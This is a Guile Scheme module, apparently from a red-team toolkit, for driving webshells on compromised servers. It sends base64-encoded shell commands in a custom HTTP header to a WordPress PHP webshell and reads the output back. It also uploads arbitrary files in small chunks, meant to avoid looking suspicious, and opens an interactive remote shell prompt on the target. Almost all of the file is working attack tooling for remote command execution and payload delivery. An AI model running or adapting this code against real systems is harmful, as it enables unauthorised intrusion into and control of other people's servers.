(read-set! keywords #f)

(define-module (skyler red-team webshell)
	#:use-module (ice-9 binary-ports)
	#:use-module (ice-9 rdelim)
	#:use-module (ice-9 string-fun)
	#:use-module (oop goops)
	#:use-module (rnrs bytevectors)
	#:use-module (skyler standard)
	#:use-module (skyler time)
	#:use-module (srfi srfi-11)
	#:use-module (srfi srfi-19)
	#:use-module (web client)
	#:use-module (web response)

	#:use-module ((guix base64) #:prefix guix.)

	#:export (
		; # Webshells
		; All webshells have the signature:
		;
		; (webshell target-host cmdline)
		;
		; It will send an appropriate HTTP request to the target which runs the command and
		; arguments in cmdline. cmdline may be a string, a list of strings, or a bytevector
		; representing the input that should be given to the target host's shell (presumably
		; /bin/sh).

		hold-on-a-second...
		; This webshell echoes the cmdline and runs it locally.

		wordpress-header-webshell
		; This webshell works against a wordpress instance using the php script in
		; webshells/wordpress-header-webshell.php.

		; # Webshell Consumers
		transfer-file
		; Signature: (_ webshell target-host output-path byteport key: (max-digits 100))
		;
		; Arguments:
		; webshell:    Any webshell, as described below.
		;
		; target-host: The hostname of the target machine.
		;
		; output-path: The location where the file should be saved on the target machine. This
		;              must include the filename, not just the directory.
		;
		; byteport:    A port which contains the data that should be placed in the file.
		;
		; max-digits:  The maximum amuont of wire data to send per request (see below for
		;              details).
		;
		; Returns:
		; Unspecified
		;
		; Examples:
		;
		; (call-with-input-file "/bin/pretty-please-give-me-root"
		; 	(lambda (port)
		; 		(transfer-file-through-webshell some-webshell
		;                                     "https://www.example.com"
		;                                     "/tmp/totally-innocent-file"
		;                                     port
		;                                     max-digits: 200)))
		;
		; This function transfers all of the data given by byteport onto the target host,
		; saved at output-path. It is useful for transfering large file in the context of a
		; webshell. An incoming message containing multiple megabytes of data might look
		; suspicious in some contexts, and for some webshells it might be technically
		; infeasible to transfer all of it at once. Therefore, this function sends the data
		; in chunks.
		;
		; The data is base64 encoded before sending for the normal reasons. The #:max-digits
		; argument specifies how many base64 digits can be sent per transaction, which means
		; that the number of bytes of data sent per transaction is `(* 0.75 max-digits)`. 
		; If the value of #:max-digits is not an even multiple of 4 then it will be rounded
		; down. It is an error if #:max-digits is less than 4.

		repl
		; Signature: (_ webshell target-host
		;               key: (prompt (format #f "WESHELL (~a)$ " target-host)))
		;
		; Arguments:
		; webshell: the webshell to use
		;
		; target-host: the hostname of the target machine
		;
		; prompt: the text of the repl's prompt, like bash's PS1 variable
		;
		; Returns:
		; unspecified
		;
		; This function transparently uses a webshell to provide an interactive command prompt
		; on the target machine. Unless a peculiar webshell is in use, the environment will be
		; reset between commands (for example, `cd /some/dir` will not do what you want it
		; to).
))

(read-set! keywords 'postfix)

(define-method (*->command-line-bytes (cmdline <string>))
	(string->utf8 cmdline))

(define-method (*->command-line-bytes (cmdline <list>))
	(*->command-line-bytes (apply string-append (interweave " " cmdline))))

(define-method (*->command-line-bytes (cmdline <bytevector>))
	cmdline)

(define (wordpress-header-webshell target-host cmdline)
	(let* ((encoded-cmdline (guix.base64-encode (*->command-line-bytes cmdline)))
	       (response (http-head target-host #:headers `((web-shell-request . ,encoded-cmdline))))
	       (output (assq 'web-shell-response (response-headers response))))
		(if output
			(string-replace-substring (cdr output) "NEWLINE_HERE" "\n")
			"")))

(define (hold-on-a-second... target-host cmdline)
	(format #t "~s~%" cmdline)
	(system cmdline))

(define (yn-question prompt)
	(define (display-prompt)
		(display prompt)
		(display " (y/n): "))

	(display-prompt)
	(let decide ((answer (read-line)))
		(cond
			((eq? (string-ref answer 0) #\y) #t)
			((eq? (string-ref answer 0) #\n) #f)
			(#t (display "Please type a lowercase y or n as your response.")
			    (display-prompt)
			    (decide (read-line))))))

(define (estimated-time webshell target-host max-bytes transfer-size)
	(let ((before (current-time)))
		(webshell target-host (string-append "echo -n "
		                                     (make-string max-bytes #\A) " > /dev/null"))
		(let* ((after (current-time))
		       (rtt   (time->period (time-difference after before)))
		       (sends (let-values (((quotient remainder) (truncate/ transfer-size max-bytes)))
		              	(+ quotient (if (> remainder 0) 1 0))))
		       (total (multiply sends rtt)))
			(format #t "Estimate: ~a (~a rtt ~a sends)~%" total rtt sends)
			(if (or (>= (minutes total) 1)
			        (>= (hours   total) 1)
			        (>= (days    total) 1))
				(yn-question (format #f "The transfer is expected to take a long time:~%~a~%Continue?"
				                        total))
				#t))))

(define* (transfer-file webshell
                        target-host
                        output-path
                        byteport
                        key: (max-digits 100)
                             (transfer-size #f))
	(when (< max-digits 4)
		(error "base64 transfers 4 digits at a time, so maximums below 4 will not work."))

	(let* ((max-digits (- max-digits (modulo max-digits 4)))
	       (max-bytes  (* (/ max-digits 4) 3))
	       (get-next-digits (lambda ()
	                        	(guix.base64-encode (get-bytevector-n byteport max-bytes)))))
		(unless (> max-bytes 0)
			(error "Somehow ended up with 0 max bytes?"))

		(if (or (not transfer-size)
		        (estimated-time webshell target-host max-bytes transfer-size))
			(let next ((digits (get-next-digits)))
				(webshell target-host (string-append "echo -n '"
				                                     digits
				                                     "' | base64 -d >> "
				                                     output-path))
				(unless (eof-object? (lookahead-u8 byteport))
					(next (get-next-digits))))
			(format #t "Aborted!"))))

(define* (repl webshell target-host
               key: (prompt (format #f "WESHELL (~a)$ " target-host)))
	(format #t "~a" prompt)
	(let ((input (read-line)))
		(unless (eof-object? input)
			(format #t "~a~%" (webshell target-host input))
			(repl webshell target-host prompt: prompt))))
